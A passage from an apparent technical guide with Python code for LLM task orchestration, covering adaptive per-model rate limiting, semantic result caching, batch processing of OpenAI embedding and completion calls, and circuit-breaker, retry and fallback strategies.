                           f"rate {self.bucket.rate:.1f} -> {new_rate:.1f} (success rate: {success_rate:.2f})")
                
                self._update_limits(new_concurrency, new_rate)
                
            elif avg_latency > self.target_latency * 1.5:
                # Latency too high, reduce concurrency slightly
                new_concurrency = max(self.min_concurrency, int(self.concurrency * 0.9))
                
                logger.info(f"Reducing concurrency due to high latency: {self.concurrency} -> {new_concurrency} "
                           f"(latency: {avg_latency:.2f}s)")
                
                self._update_limits(new_concurrency, self.bucket.rate)
                
            elif success_rate > 0.98 and avg_latency < self.target_latency * 0.8:
                # Everything looks good, try increasing concurrency and rate
                new_concurrency = min(self.max_concurrency, int(self.concurrency * 1.1) + 1)
                new_rate = min(100.0, self.bucket.rate * 1.1)
                
                logger.info(f"Increasing limits: concurrency {self.concurrency} -> {new_concurrency}, "
                           f"rate {self.bucket.rate:.1f} -> {new_rate:.1f} (success rate: {success_rate:.2f}, "
                           f"latency: {avg_latency:.2f}s)")
                
                self._update_limits(new_concurrency, new_rate)
    
    def _update_limits(self, new_concurrency: int, new_rate: float):
        """Update concurrency and rate limits."""
        # Update concurrency
        if new_concurrency > self.concurrency:
            # Add permits to the semaphore
            for _ in range(new_concurrency - self.concurrency):
                self.semaphore.release()
        elif new_concurrency < self.concurrency:
            # Cannot directly reduce semaphore count
            # Create a new semaphore and use it going forward
            self.semaphore = threading.Semaphore(new_concurrency)
        
        self.concurrency = new_concurrency
        
        # Update rate limit
        self.bucket = TokenBucket(new_rate, new_rate * 2)  # Allow 2 seconds of burst

class ModelBasedRateLimiter:
    """Rate limiter that tracks limits separately for different LLM models."""
    
    def __init__(self):
        """Initialize with default rate limits for different models."""
        self.limiters = {
            # Format: model_name: (rate_per_minute, max_concurrency)
            "gpt-4-turbo": AdaptiveRateLimiter(initial_rate=6.0, initial_concurrency=3),  # 6 RPM
            "gpt-3.5-turbo": AdaptiveRateLimiter(initial_rate=50.0, initial_concurrency=10),  # 50 RPM
            "text-embedding-ada-002": AdaptiveRateLimiter(initial_rate=100.0, initial_concurrency=20),  # 100 RPM
            "default": AdaptiveRateLimiter(initial_rate=10.0, initial_concurrency=5)  # Default fallback
        }
    
    def execute(self, model: str, func: Callable, *args, **kwargs) -> Any:
        """
        Execute a function with rate limiting based on model.
        
        Args:
            model: Model name
            func: Function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the function
        """
        limiter = self.limiters.get(model, self.limiters["default"])
        return limiter.execute(func, *args, **kwargs)
    
    def get_limits(self, model: Optional[str] = None) -> Dict[str, Any]:
        """
        Get current rate limits for a model or all models.
        
        Args:
            model: Optional model name
            
        Returns:
            Dictionary with rate limit information
        """
        if model:
            limiter = self.limiters.get(model, self.limiters["default"])
            return {model: limiter.get_current_limits()}
        
        return {model: limiter.get_current_limits() for model, limiter in self.limiters.items()}
```

**3. Implement Smart Caching and Result Reuse**

```python
# task_orchestration/smart_cache.py
import hashlib
import json
import time
import threading
import logging
from typing import Dict, Any, Optional, Callable, Tuple, List, Union
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class CacheEntry:
    """An entry in the cache."""
    value: Any
    created_at: float
    expires_at: Optional[float]
    cost: float = 0.0  # For cost-based accounting (e.g., token count, API cost)

class SmartCache:
    """
    Smart caching system with TTL, cost-awareness, and partial matching capabilities.
    """
    
    def __init__(self, 
                 max_size: int = 1000, 
                 default_ttl: int = 3600,
                 semantic_cache_threshold: float = 0.92):
        """
        Initialize the smart cache.
        
        Args:
            max_size: Maximum number of items in the cache
            default_ttl: Default time-to-live in seconds
            semantic_cache_threshold: Threshold for semantic similarity matching
        """
        self.cache = {}
        self.max_size = max_size
        self.default_ttl = default_ttl
        self.semantic_cache_threshold = semantic_cache_threshold
        self.lock = threading.RLock()
        self.metrics = {
            "hits": 0,
            "misses": 0,
            "semantic_hits": 0,
            "evictions": 0,
            "total_cost_saved": 0.0
        }
        
        # Start cleanup thread
        self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
        self.cleanup_thread.start()
    
    def _hash_key(self, key: Any) -> str:
        """
        Create a hash from any key object.
        
        Args:
            key: The key to hash (will be converted to JSON)
            
        Returns:
            Hashed key string
        """
        if isinstance(key, str):
            key_str = key
        else:
            # Convert objects to JSON for hashing
            key_str = json.dumps(key, sort_keys=True)
        
        return hashlib.md5(key_str.encode('utf-8')).hexdigest()
    
    def get(self, key: Any) -> Tuple[bool, Any]:
        """
        Get an item from the cache.
        
        Args:
            key: Cache key
            
        Returns:
            Tuple of (found, value)
        """
        hashed_key = self._hash_key(key)
        
        with self.lock:
            if hashed_key in self.cache:
                entry = self.cache[hashed_key]
                
                # Check if expired
                if entry.expires_at and time.time() > entry.expires_at:
                    del self.cache[hashed_key]
                    self.metrics["misses"] += 1
                    return False, None
                
                self.metrics["hits"] += 1
                self.metrics["total_cost_saved"] += entry.cost
                return True, entry.value
            
            self.metrics["misses"] += 1
            return False, None
    
    def set(self, 
            key: Any, 
            value: Any, 
            ttl: Optional[int] = None, 
            cost: float = 0.0) -> None:
        """
        Set an item in the cache.
        
        Args:
            key: Cache key
            value: Value to cache
            ttl: Time-to-live in seconds (None for default)
            cost: Cost metric associated with generating this value
        """
        ttl = ttl if ttl is not None else self.default_ttl
        hashed_key = self._hash_key(key)
        
        with self.lock:
            # Evict items if at max capacity
            if len(self.cache) >= self.max_size and hashed_key not in self.cache:
                self._evict_one()
            
            expires_at = time.time() + ttl if ttl else None
            
            self.cache[hashed_key] = CacheEntry(
                value=value,
                created_at=time.time(),
                expires_at=expires_at,
                cost=cost
            )
    
    def delete(self, key: Any) -> bool:
        """
        Delete an item from the cache.
        
        Args:
            key: Cache key
            
        Returns:
            True if item was deleted, False if not found
        """
        hashed_key = self._hash_key(key)
        
        with self.lock:
            if hashed_key in self.cache:
                del self.cache[hashed_key]
                return True
            return False
    
    def clear(self) -> None:
        """Clear all items from the cache."""
        with self.lock:
            self.cache.clear()
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get cache metrics."""
        with self.lock:
            metrics = self.metrics.copy()
            metrics["size"] = len(self.cache)
            if metrics["hits"] + metrics["misses"] > 0:
                metrics["hit_ratio"] = metrics["hits"] / (metrics["hits"] + metrics["misses"])
            else:
                metrics["hit_ratio"] = 0
            return metrics
    
    def _evict_one(self) -> None:
        """Evict one item from the cache based on LRU policy."""
        if not self.cache:
            return
        
        # Find the oldest entry
        oldest_key = min(self.cache, key=lambda k: self.cache[k].created_at)
        del self.cache[oldest_key]
        self.metrics["evictions"] += 1
    
    def _cleanup_loop(self) -> None:
        """Background thread that cleans up expired entries."""
        while True:
            time.sleep(60)  # Check every minute
            self._cleanup_expired()
    
    def _cleanup_expired(self) -> None:
        """Remove all expired items from the cache."""
        now = time.time()
        
        with self.lock:
            expired_keys = [
                k for k, v in self.cache.items() 
                if v.expires_at and now > v.expires_at
            ]
            
            for key in expired_keys:
                del self.cache[key]

class SemanticCache(SmartCache):
    """
    Cache that supports semantic similarity matching for AI responses.
    """
    
    def __init__(self,
                 embedding_func: Callable[[str], List[float]],
                 **kwargs):
        """
        Initialize the semantic cache.
        
        Args:
            embedding_func: Function that converts text to embeddings
            **kwargs: Arguments to pass to SmartCache
        """
        super().__init__(**kwargs)
        self.embedding_func = embedding_func
        self.embedding_cache = {}  # Maps hashed_key to embeddings
    
    def _compute_similarity(self, embedding1: List[float], embedding2: List[float]) -> float:
        """
        Compute cosine similarity between two embeddings.
        
        Args:
            embedding1: First embedding
            embedding2: Second embedding
            
        Returns:
            Similarity score (0-1)
        """
        import numpy as np
        
        # Normalize embeddings
        embedding1 = np.array(embedding1)
        embedding2 = np.array(embedding2)
        
        norm1 = np.linalg.norm(embedding1)
        norm2 = np.linalg.norm(embedding2)
        
        if norm1 == 0 or norm2 == 0:
            return 0
        
        return np.dot(embedding1, embedding2) / (norm1 * norm2)
    
    def set(self, 
            key: Any, 
            value: Any, 
            ttl: Optional[int] = None, 
            cost: float = 0.0) -> None:
        """
        Set an item in the cache with semantic indexing.
        
        Args:
            key: Cache key
            value: Value to cache
            ttl: Time-to-live in seconds
            cost: Cost metric
        """
        super().set(key, value, ttl, cost)
        
        # Store embedding for semantic matching if key is a string
        if isinstance(key, str):
            try:
                hashed_key = self._hash_key(key)
                embedding = self.embedding_func(key)
                self.embedding_cache[hashed_key] = embedding
            except Exception as e:
                logger.warning(f"Failed to compute embedding for cache key: {e}")
    
    def semantic_get(self, key: str) -> Tuple[bool, Any, float]:
        """
        Get an item from the cache using semantic matching.
        
        Args:
            key: Query string
            
        Returns:
            Tuple of (found, value, similarity)
        """
        # First try exact match
        exact_found, exact_value = self.get(key)
        if exact_found:
            return True, exact_value, 1.0
        
        # If not found, try semantic matching
        try:
            query_embedding = self.embedding_func(key)
            
            best_match = None
            best_similarity = 0
            
            with self.lock:
                for hashed_key, embedding in self.embedding_cache.items():
                    if hashed_key in self.cache:  # Ensure it's still in the cache
                        similarity = self._compute_similarity(query_embedding, embedding)
                        
                        if similarity > best_similarity:
                            best_similarity = similarity
                            best_match = hashed_key
            
            # Check if we found a good match
            if best_match and best_similarity >= self.semantic_cache_threshold:
                entry = self.cache[best_match]
                
                # Check if expired
                if entry.expires_at and time.time() > entry.expires_at:
                    return False, None, 0
                
                self.metrics["semantic_hits"] += 1
                self.metrics["total_cost_saved"] += entry.cost
                return True, entry.value, best_similarity
            
            return False, None, best_similarity
            
        except Exception as e:
            logger.warning(f"Error in semantic matching: {e}")
            return False, None, 0
    
    def delete(self, key: Any) -> bool:
        """
        Delete an item from the cache.
        
        Args:
            key: Cache key
            
        Returns:
            True if item was deleted, False if not found
        """
        hashed_key = self._hash_key(key)
        
        with self.lock:
            if hashed_key in self.embedding_cache:
                del self.embedding_cache[hashed_key]
            
            if hashed_key in self.cache:
                del self.cache[hashed_key]
                return True
            return False
    
    def clear(self) -> None:
        """Clear all items from the cache."""
        with self.lock:
            self.cache.clear()
            self.embedding_cache.clear()

class AgentResultCache:
    """
    Specialized cache for AI agent results with support for partial results and 
    context-aware caching.
    """
    
    def __init__(self, 
                 embedding_func: Callable[[str], List[float]],
                 max_size: int = 5000,
                 default_ttl: int = 3600,
                 similarity_threshold: float = 0.92):
        """
        Initialize the agent result cache.
        
        Args:
            embedding_func: Function to convert text to vector embeddings
            max_size: Maximum cache size
            default_ttl: Default TTL in seconds
            similarity_threshold: Threshold for semantic matching
        """
        self.semantic_cache = SemanticCache(
            embedding_func=embedding_func,
            max_size=max_size,
            default_ttl=default_ttl,
            semantic_cache_threshold=similarity_threshold
        )
        self.context_cache = {}  # For context-specific caching
    
    def get_result(self, 
                  query: str,
                  agent_type: str,
                  context: Optional[Dict[str, Any]] = None) -> Tuple[bool, Any, float]:
        """
        Get agent result from cache considering query, agent type, and context.
        
        Args:
            query: User query
            agent_type: Type of agent
            context: Optional context parameters
            
        Returns:
            Tuple of (found, result, similarity)
        """
        # Create cache key that includes agent type and essential context
        cache_key = self._create_cache_key(query, agent_type, context)
        
        # Try exact context match first
        exact_found, exact_result = self.semantic_cache.get(cache_key)
        if exact_found:
            return True, exact_result, 1.0
        
        # If not found, try semantic matching on query only
        return self.semantic_cache.semantic_get(query)
    
    def store_result(self,
                    query: str,
                    agent_type: str,
                    result: Any,
                    context: Optional[Dict[str, Any]] = None,
                    ttl: Optional[int] = None,
                    cost: float = 0.0) -> None:
        """
        Store agent result in cache.
        
        Args:
            query: User query
            agent_type: Type of agent
            result: Agent result to cache
            context: Optional context parameters
            ttl: Optional TTL in seconds
            cost: Cost metric (e.g., tokens used)
        """
        # Create cache key
        cache_key = self._create_cache_key(query, agent_type, context)
        
        # Store in semantic cache
        self.semantic_cache.set(cache_key, result, ttl, cost)
        
        # Also store with query only for semantic matching
        self.semantic_cache.set(query, result, ttl, cost)
    
    def _create_cache_key(self, 
                         query: str, 
                         agent_type: str,
                         context: Optional[Dict[str, Any]]) -> str:
        """
        Create a cache key from query, agent type, and context.
        
        Args:
            query: User query
            agent_type: Type of agent
            context: Optional context parameters
            
        Returns:
            Cache key string
        """
        # Start with the query and agent type
        key_parts = [query, agent_type]
        
        # Add essential context parameters if provided
        if context:
            # Filter to include only cache-relevant context
            # This prevents minor context changes from invalidating the cache
            cache_relevant_keys = [
                'language', 'domain', 'persona', 'level', 
                'format', 'length', 'temperature'
            ]
            
            relevant_context = {
                k: v for k, v in context.items() 
                if k in cache_relevant_keys and v is not None
            }
            
            if relevant_context:
                # Sort to ensure consistent ordering
                context_str = json.dumps(relevant_context, sort_keys=True)
                key_parts.append(context_str)
        
        return "||".join(key_parts)
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get cache metrics."""
        return self.semantic_cache.get_metrics()
    
    def clear(self) -> None:
        """Clear the cache."""
        self.semantic_cache.clear()
        self.context_cache.clear()
```

**4. Batch Processing for Efficiency**

```python
# task_orchestration/batch_processor.py
import time
import threading
import asyncio
import logging
from typing import Dict, List, Any, Optional, Callable, Tuple, Generic, TypeVar
from dataclasses import dataclass
from queue import Queue

T = TypeVar('T')  # Input type
R = TypeVar('R')  # Result type

logger = logging.getLogger(__name__)

@dataclass
class BatchTask(Generic[T, R]):
    """A task to be processed in a batch."""
    id: str
    input: T
    callback: Callable[[str, R], None]
    created_at: float = time.time()

@dataclass
class BatchResult(Generic[R]):
    """Result of a batch operation."""
    results: Dict[str, R]
    batch_size: int
    processing_time: float

class BatchProcessor(Generic[T, R]):
    """
    Processes tasks in batches for more efficient API calls.
    """
    
    def __init__(self, 
                 batch_processor_func: Callable[[List[T]], Dict[int, R]],
                 max_batch_size: int = 20,
                 max_wait_time: float = 0.1,
                 min_batch_size: int = 1):
        """
        Initialize the batch processor.
        
        Args:
            batch_processor_func: Function that processes a batch of inputs
            max_batch_size: Maximum batch size
            max_wait_time: Maximum wait time in seconds before processing a batch
            min_batch_size: Minimum batch size to process
        """
        self.batch_processor_func = batch_processor_func
        self.max_batch_size = max_batch_size
        self.max_wait_time = max_wait_time
        self.min_batch_size = min_batch_size
        
        self.queue = Queue()
        self.processing_thread = threading.Thread(target=self._processing_loop, daemon=True)
        self.processing_thread.start()
        
        self.metrics = {
            "total_items_processed": 0,
            "total_batches_processed": 0,
            "avg_batch_size": 0,
            "avg_wait_time": 0,
            "avg_processing_time": 0
        }
    
    def submit(self, task_id: str, input_item: T, 
              callback: Callable[[str, R], None]) -> None:
        """
        Submit a task for batch processing.
        
        Args:
            task_id: Unique ID for the task
            input_item: Input to process
            callback: Function to call with the result
        """
        task = BatchTask(id=task_id, input=input_item, callback=callback)
        self.queue.put(task)
    
    def _processing_loop(self) -> None:
        """Main processing loop that gathers tasks into batches."""
        while True:
            batch = []
            start_wait = time.time()
            
            # Get first item (blocking)
            first_item = self.queue.get()
            batch.append(first_item)
            
            # Try to fill batch up to max_batch_size or until max_wait_time
            batch_timeout = time.time() + self.max_wait_time
            
            while len(batch) < self.max_batch_size and time.time() < batch_timeout:
                try:
                    # Non-blocking queue get
                    item = self.queue.get(block=False)
                    batch.append(item)
                except:
                    # No more items available now
                    if len(batch) >= self.min_batch_size:
                        # We have enough items, process now
                        break
                    
                    # Not enough items, wait a bit
                    time.sleep(0.01)
            
            wait_time = time.time() - start_wait
            
            # Process the batch
            self._process_batch(batch, wait_time)
    
    def _process_batch(self, batch: List[BatchTask[T, R]], wait_time: float) -> None:
        """
        Process a batch of tasks.
        
        Args:
            batch: List of tasks to process
            wait_time: Time spent waiting for the batch to fill
        """
        if not batch:
            return
        
        try:
            # Extract inputs and create index mapping
            inputs = []
            id_to_index = {}
            
            for i, task in enumerate(batch):
                inputs.append(task.input)
                id_to_index[task.id] = i
            
            # Process the batch
            start_time = time.time()
            
            # The batch processor function should return results mapped by index
            index_results = self.batch_processor_func(inputs)
            
            processing_time = time.time() - start_time
            
            # Map results back to tasks by ID and call callbacks
            for task in batch:
                index = id_to_index[task.id]
                result = index_results.get(index)
                
                try:
                    task.callback(task.id, result)
                except Exception as e:
                    logger.error(f"Error in callback for task {task.id}: {e}")
            
            # Update metrics
            batch_size = len(batch)
            self.metrics["total_items_processed"] += batch_size
            self.metrics["total_batches_processed"] += 1
            
            # Update averages
            self.metrics["avg_batch_size"] = (
                (self.metrics["avg_batch_size"] * (self.metrics["total_batches_processed"] - 1) + batch_size) / 
                self.metrics["total_batches_processed"]
            )
            
            self.metrics["avg_wait_time"] = (
                (self.metrics["avg_wait_time"] * (self.metrics["total_batches_processed"] - 1) + wait_time) / 
                self.metrics["total_batches_processed"]
            )
            
            self.metrics["avg_processing_time"] = (
                (self.metrics["avg_processing_time"] * (self.metrics["total_batches_processed"] - 1) + processing_time) / 
                self.metrics["total_batches_processed"]
            )
            
            logger.debug(f"Processed batch of {batch_size} items in {processing_time:.3f}s")
            
        except Exception as e:
            logger.error(f"Error processing batch: {e}")
            
            # Call callbacks with error for all tasks
            for task in batch:
                try:
                    task.callback(task.id, None)
                except Exception as callback_error:
                    logger.error(f"Error in error callback for task {task.id}: {callback_error}")
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get processor metrics."""
        metrics = self.metrics.copy()
        metrics["queue_size"] = self.queue.qsize()
        return metrics

class AsyncBatchProcessor(Generic[T, R]):
    """
    Asynchronous version of the batch processor for use with asyncio.
    """
    
    def __init__(self, 
                 batch_processor_func: Callable[[List[T]], Dict[int, R]],
                 max_batch_size: int = 20,
                 max_wait_time: float = 0.1,
                 min_batch_size: int = 1):
        """
        Initialize the async batch processor.
        
        Args:
            batch_processor_func: Function that processes a batch of inputs
            max_batch_size: Maximum batch size
            max_wait_time: Maximum wait time in seconds before processing a batch
            min_batch_size: Minimum batch size to process
        """
        self.batch_processor_func = batch_processor_func
        self.max_batch_size = max_batch_size
        self.max_wait_time = max_wait_time
        self.min_batch_size = min_batch_size
        
        self.queue = asyncio.Queue()
        self.processing_task = None
        
        self.metrics = {
            "total_items_processed": 0,
            "total_batches_processed": 0,
            "avg_batch_size": 0,
            "avg_wait_time": 0,
            "avg_processing_time": 0
        }
    
    async def start(self) -> None:
        """Start the processing task."""
        if not self.processing_task:
            self.processing_task = asyncio.create_task(self._processing_loop())
    
    async def stop(self) -> None:
        """Stop the processing task."""
        if self.processing_task:
            self.processing_task.cancel()
            try:
                await self.processing_task
            except asyncio.CancelledError:
                pass
            self.processing_task = None
    
    async def submit(self, task_id: str, input_item: T) -> R:
        """
        Submit a task for batch processing and await the result.
        
        Args:
            task_id: Unique ID for the task
            input_item: Input to process
            
        Returns:
            Processing result
        """
        # Create future for the result
        result_future = asyncio.Future()
        
        # Define callback that resolves the future
        def callback(task_id: str, result: R) -> None:
            if not result_future.done():
                result_future.set_result(result)
        
        # Create task
        task = BatchTask(id=task_id, input=input_item, callback=callback)
        
        # Submit to queue
        await self.queue.put(task)
        
        # Start processing if not already started
        if not self.processing_task:
            await self.start()
        
        # Wait for result
        return await result_future
    
    async def _processing_loop(self) -> None:
        """Main processing loop that gathers tasks into batches."""
        while True:
            batch = []
            start_wait = time.time()
            
            # Get first item (blocking)
            first_item = await self.queue.get()
            batch.append(first_item)
            
            # Try to fill batch up to max_batch_size or until max_wait_time
            batch_timeout = time.time() + self.max_wait_time
            
            while len(batch) < self.max_batch_size and time.time() < batch_timeout:
                try:
                    # Non-blocking queue get
                    item = self.queue.get_nowait()
                    batch.append(item)
                except asyncio.QueueEmpty:
                    # No more items available now
                    if len(batch) >= self.min_batch_size:
                        # We have enough items, process now
                        break
                    
                    # Not enough items, wait a bit
                    await asyncio.sleep(0.01)
            
            wait_time = time.time() - start_wait
            
            # Process the batch
            await self._process_batch(batch, wait_time)
    
    async def _process_batch(self, batch: List[BatchTask[T, R]], wait_time: float) -> None:
        """
        Process a batch of tasks.
        
        Args:
            batch: List of tasks to process
            wait_time: Time spent waiting for the batch to fill
        """
        if not batch:
            return
        
        try:
            # Extract inputs and create index mapping
            inputs = []
            id_to_index = {}
            
            for i, task in enumerate(batch):
                inputs.append(task.input)
                id_to_index[task.id] = i
            
            # Process the batch
            start_time = time.time()
            
            # Convert to a coroutine if the function is synchronous
            if asyncio.iscoroutinefunction(self.batch_processor_func):
                index_results = await self.batch_processor_func(inputs)
            else:
                # Run in a thread pool if it's a blocking function
                index_results = await asyncio.to_thread(self.batch_processor_func, inputs)
            
            processing_time = time.time() - start_time
            
            # Map results back to tasks by ID and call callbacks
            for task in batch:
                index = id_to_index[task.id]
                result = index_results.get(index)
                task.callback(task.id, result)
            
            # Update metrics
            batch_size = len(batch)
            self.metrics["total_items_processed"] += batch_size
            self.metrics["total_batches_processed"] += 1
            
            # Update averages
            self.metrics["avg_batch_size"] = (
                (self.metrics["avg_batch_size"] * (self.metrics["total_batches_processed"] - 1) + batch_size) / 
                self.metrics["total_batches_processed"]
            )
            
            self.metrics["avg_wait_time"] = (
                (self.metrics["avg_wait_time"] * (self.metrics["total_batches_processed"] - 1) + wait_time) / 
                self.metrics["total_batches_processed"]
            )
            
            self.metrics["avg_processing_time"] = (
                (self.metrics["avg_processing_time"] * (self.metrics["total_batches_processed"] - 1) + processing_time) / 
                self.metrics["total_batches_processed"]
            )
            
            logger.debug(f"Processed batch of {batch_size} items in {processing_time:.3f}s")
            
        except Exception as e:
            logger.error(f"Error processing batch: {e}")
            
            # Call callbacks with error for all tasks
            for task in batch:
                try:
                    task.callback(task.id, None)
                except Exception as callback_error:
                    logger.error(f"Error in error callback for task {task.id}: {callback_error}")
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get processor metrics."""
        metrics = self.metrics.copy()
        metrics["queue_size"] = self.queue.qsize()
        return metrics

# Example usage with OpenAI embeddings
async def openai_embedding_batch_processor(texts: List[str]) -> Dict[int, List[float]]:
    """
    Process a batch of texts into embeddings using OpenAI API.
    
    Args:
        texts: List of texts to embed
        
    Returns:
        Dictionary mapping input indices to embedding vectors
    """
    import openai
    
    try:
        # Make the API call with all texts at once
        response = await openai.Embedding.acreate(
            model="text-embedding-ada-002",
            input=texts
        )
        
        # Map results back to original indices
        results = {}
        for i, embedding_data in enumerate(response.data):
            results[i] = embedding_data.embedding
        
        return results
        
    except Exception as e:
        logger.error(f"Error in batch embedding: {e}")
        return {}

# Example usage with LLM completions
async def openai_completion_batch_processor(prompts: List[str]) -> Dict[int, str]:
    """
    Process a batch of prompts into completions using OpenAI API.
    
    Args:
        prompts: List of prompts
        
    Returns:
        Dictionary mapping input indices to completion strings
    """
    import openai
    
    try:
        # Create a single API call with multiple prompts
        response = await openai.Completion.acreate(
            model="text-davinci-003",
            prompt=prompts,
            max_tokens=100,
            n=1,
            temperature=0.7
        )
        
        # Map results back to original indices
        results = {}
        for i, choice in enumerate(response.choices):
            results[i] = choice.text.strip()
        
        return results
        
    except Exception as e:
        logger.error(f"Error in batch completion: {e}")
        return {}
```

**5. Implementing Graceful Degradation and Fallbacks**

```python
# task_orchestration/fallback_strategies.py
import time
import random
import logging
from typing import Dict, List, Any, Optional, Callable, TypeVar, Generic, Union

T = TypeVar('T')  # Input type
R = TypeVar('R')  # Result type

logger = logging.getLogger(__name__)

class CircuitBreaker:
    """
    Circuit breaker pattern implementation to prevent cascading failures.
    """
    
    CLOSED = "closed"      # Normal operation, requests go through
    OPEN = "open"          # Circuit is open, requests fail fast
    HALF_OPEN = "half_open"  # Testing if service is back to normal
    
    def __init__(self, 
                 failure_threshold: int = 5,
                 reset_timeout: float = 60.0,
                 half_open_max_calls: int = 1):
        """
        Initialize circuit breaker.
        
        Args:
            failure_threshold: Number of failures before opening the circuit
            reset_timeout: Time in seconds before attempting to reset circuit
            half_open_max_calls: Maximum number of calls allowed in half-open state
        """
        self.failure_threshold = failure_threshold
        self.reset_timeout = reset_timeout
        self.half_open_max_calls = half_open_max_calls
        
        self.state = self.CLOSED
        self.failure_count = 0
        self.last_failure_time = 0
        self.half_open_calls = 0
    
    def __call__(self, func):
        """
        Decorator for functions that should use circuit breaker.
        
        Args:
            func: Function to wrap
            
        Returns:
            Wrapped function
        """
        def wrapper(*args, **kwargs):
            return self.execute(func, *args, **kwargs)
        return wrapper
    
    def execute(self, func, *args, **kwargs):
        """
        Execute function with circuit breaker protection.
        
        Args:
            func: Function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the function or raises exception if circuit is open
            
        Raises:
            CircuitBreakerOpenError: If circuit is open
        """
        if self.state == self.OPEN:
            if time.time() - self.last_failure_time >= self.reset_timeout:
                logger.info("Circuit half-open, allowing test request")
                self.state = self.HALF_OPEN
                self.half_open_calls = 0
            else:
                raise CircuitBreakerOpenError(f"Circuit breaker is open until {self.last_failure_time + self.reset_timeout}")
        
        if self.state == self.HALF_OPEN and self.half_open_calls >= self.half_open_max_calls:
            raise CircuitBreakerOpenError("Circuit breaker is half-open and at call limit")
        
        try:
            if self.state == self.HALF_OPEN:
                self.half_open_calls += 1
            
            result = func(*args, **kwargs)
            
            # Success, reset if needed
            if self.state == self.HALF_OPEN:
                logger.info("Success in half-open state, closing circuit")
                self.state = self.CLOSED
                self.failure_count = 0
            
            return result
            
        except Exception as e:
            self._handle_failure(e)
            raise
    
    def _handle_failure(self, exception):
        """
        Handle a failure by updating circuit state.
        
        Args:
            exception: The exception that occurred
        """
        self.failure_count += 1
        self.last_failure_time = time.time()
        
        if self.state == self.HALF_OPEN or self.failure_count >= self.failure_threshold:
            logger.warning(f"Circuit breaker opening due to {self.failure_count} failures")
            self.state = self.OPEN
    
    def reset(self):
        """Reset the circuit breaker to closed state."""
        self.state = self.CLOSED
        self.failure_count = 0
        self.half_open_calls = 0
    
    def get_state(self) -> Dict[str, Any]:
        """Get the current state of the circuit breaker."""
        return {
            "state": self.state,
            "failure_count": self.failure_count,
            "last_failure_time": self.last_failure_time,
            "half_open_calls": self.half_open_calls,
            "reset_time": self.last_failure_time + self.reset_timeout if self.state == self.OPEN else None
        }

class CircuitBreakerOpenError(Exception):
    """Error raised when circuit breaker is open."""
    pass

class RetryStrategy:
    """
    Retry strategy with exponential backoff and jitter.
    """
    
    def __init__(self, 
                 max_retries: int = 3,
                 base_delay: float = 1.0,
                 max_delay: float = 60.0,
                 jitter: bool = True,
                 retry_on: Optional[List[type]] = None):
        """
        Initialize retry strategy.
        
        Args:
            max_retries: Maximum number of retries
            base_delay: Base delay in seconds
            max_delay: Maximum delay in seconds
            jitter: Whether to add randomness to delay
            retry_on: List of exception types to retry on, or None for all
        """
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.jitter = jitter
        self.retry_on = retry_on
    
    def __call__(self, func):
        """
        Decorator for functions that should use retry strategy.
        
        Args:
            func: Function to wrap
            
        Returns:
            Wrapped function
        """
        def wrapper(*args, **kwargs):
            return self.execute(func, *args, **kwargs)
        return wrapper
    
    def execute(self, func, *args, **kwargs):
        """
        Execute function with retry strategy.
        
        Args:
            func: Function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the function
            
        Raises:
            Exception: The last exception if all retries fail
        """
        last_exception = None
        
        for attempt in range(self.max_retries + 1):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                last_exception = e
                
                # Check if we should retry this exception
                if self.retry_on and not any(isinstance(e, ex_type) for ex_type in self.retry_on):
                    logger.debug(f"Not retrying exception {type(e).__name__} as it's not in retry_on list")
                    raise
                
                if attempt == self.max_retries:
                    logger.warning(f"Max retries ({self.max_retries}) reached, raising last exception")
                    raise
                
                # Calculate delay with exponential backoff
                delay = min(self.max_delay, self.base_delay * (2 ** attempt))
                
                # Add jitter if enabled (prevents thundering herd problem)
                if self.jitter:
                    delay = delay * (0.5 + random.random())
                
                logger.info(f"Retry {attempt+1}/{self.max_retries} after {delay:.2f}s due to {type(e).__name__}: {str(e)}")
                time.sleep(delay)
        
        # This should never be reached, but just in case
        raise last_exception if last_exception else RuntimeError("Retry strategy failed")

class FallbackStrategy(Generic[T, R]):
    """
    Fallback strategy that tries alternative approaches if primary fails.
    """
    
    def __init__(self, 
                 fallbacks: List[Callable[[T], R]],
                 should_fallback: Optional[Callable[[Exception], bool]] = None):
        """
        Initialize fallback strategy.
        
        Args:
            fallbacks: List of fallback functions to try
            should_fallback: Optional function to decide if fallback should be used
        """
        self.fallbacks = fallbacks
        self.should_fallback = should_fallback
    
    def __call__(self, primary_func):
        """
        Decorator for functions that should use fallback strategy.
        
        Args:
            primary_func: Primary function to wrap
            
        Returns:
            Wrapped function
        """
        def wrapper(*args, **kwargs):
            return self.execute(primary_func, *args, **kwargs)
        return wrapper
    
    def execute(self, primary_func, *args, **kwargs):
        """
        Execute primary function with fallbacks if needed.
        
        Args:
            primary_func: Primary function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the primary function or a fallback
            
        Raises:
            Exception: If all fallbacks fail
        """
        # Try primary function first
        try:
            return primary_func(*args, **kwargs)
        except Exception as primary_exception:
            # Check if we should fallback
            if self.should_fallback and not self.should_fallback(primary_exception):
                logger.debug(f"Not using fallback for {type(primary_exception).__name__}: {str(primary_exception)}")
                raise
            
            logger.info(f"Primary function failed with {type(primary_exception).__name__}, trying fallbacks")
            
            # Try each fallback
            last_exception = primary_exception
            
            for i, fallback in enumerate(self.fallbacks):
                try:
                    logger.info(f"Trying fallback {i+1}/{len(self.fallbacks)}")
                    return fallback(*args, **kwargs)
                except Exception as fallback_exception:
                    logger.warning(f"Fallback {i+1} failed with {type(fallback_exception).__name__}: {str(fallback_exception)}")
                    last_exception = fallback_exception
            
            # All fallbacks failed
            logger.error("All fallbacks failed")
            raise last_exception

class ModelFallbackChain:
    """
    Chain of LLM models to try, falling back to less capable models if primary fails.
    """
    
    def __init__(self, model_configs: List[Dict[str, Any]]):
        """
        Initialize the model fallback chain.
        
        Args:
            model_configs: List of model configurations in priority order
        """
        self.model_configs = model_configs
    
    async def generate(self, 
                     prompt: str, 
